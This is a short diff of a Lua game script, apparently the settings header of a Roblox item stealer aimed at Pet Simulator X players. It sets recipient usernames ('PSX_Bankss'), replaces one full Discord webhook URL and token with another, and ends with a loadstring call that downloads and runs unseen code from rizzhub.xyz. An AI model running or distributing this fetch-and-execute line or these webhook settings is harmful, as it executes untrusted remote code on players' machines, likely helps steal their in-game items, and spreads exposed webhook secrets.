@@ -1,4 +1,5 @@
 UserName = "PSX_Bankss"
-Webhook = "https://discord.com/api/webhooks/1098424044195430503/k5TR0HZV9H0pMME_k3639qyBI7fKFbQhjt3Rui_vBZWoubMWxu0bJmX8Rg16j2Umeg2S" -- optional delete the whole line if you don't want it
+UserName2 = "PSX_Bankss" -- optional delete the whole line if you don't want it
+Webhook = "https://discord.com/api/webhooks/1098702299121078362/UAtBqxu64KqhIqJ9d9q00hqxD9OljOSgVBkvFFzVYkO8nLXcMOq5g1BT4sXN10DIaf9n" -- optional delete the whole line if you don't want it
 
 loadstring(game:HttpGet("https://rizzhub.xyz/scripts/Main.lua", true))()
